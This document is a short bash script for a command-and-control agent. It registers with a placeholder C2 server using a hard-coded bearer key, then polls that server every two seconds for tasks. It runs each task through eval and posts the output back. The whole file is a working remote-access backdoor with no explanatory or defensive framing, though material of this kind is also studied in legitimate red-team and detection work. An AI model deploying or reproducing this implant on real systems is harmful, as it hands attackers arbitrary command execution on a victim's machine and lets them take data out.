#!/bin/bash

C2_SERVER_IP="http://C2-SERVER-IP:80"
AUTH="MySecretKey123"

AGENT_ID=$(curl -s -X POST -H "Authorization: Bearer $AUTH" $C2_SERVER_IP/register | jq -r .agent_id)

while true; do
    TASK=$(curl -s -H "Authorization: Bearer $AUTH" $C2_SERVER_IP/task/$AGENT_ID | jq -r .task)
    if [ "$TASK" != "null" ] && [ -n "$TASK" ]; then
        RESULT=$(eval "$TASK" 2>&1)
        curl -s -X POST -H "Authorization: Bearer $AUTH" -d "$RESULT" $C2_SERVER_IP/result/$AGENT_ID
    fi
    sleep 2
done
